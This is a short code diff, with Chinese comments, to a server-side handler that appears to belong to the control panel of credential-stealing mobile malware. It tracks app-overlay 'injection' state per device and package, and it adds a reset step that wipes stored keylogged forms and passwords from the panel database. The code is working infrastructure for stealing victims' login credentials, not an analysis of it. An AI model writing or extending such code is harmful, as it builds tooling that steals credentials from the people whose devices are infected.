@@ -612,6 +612,13 @@ def h_inj_track_act(b, q, a):
                     _db.inj_state_clear(d)
             elif _pkg:
                 _db.inj_state_set(d, _pkg, {'inject': 'injected', 'skip': 'skipped'}.get(act, act))
+            # 重注入：把旧的表单/密码彻底删掉，面板不再回显
+            if act == 'reset':
+                try:
+                    _db.keylog_clear(d, _pkg or None)
+                    print('[inj] reset 清理旧记录 dev=%s pkg=%s' % (d, _pkg or '*'), flush=True)
+                except Exception as e:
+                    print('[inj] reset 清理失败: %s' % e, flush=True)
     except Exception as e:
         print('[inj] track_act 落库失败: %s' % e, flush=True)
     if act == 'inject':
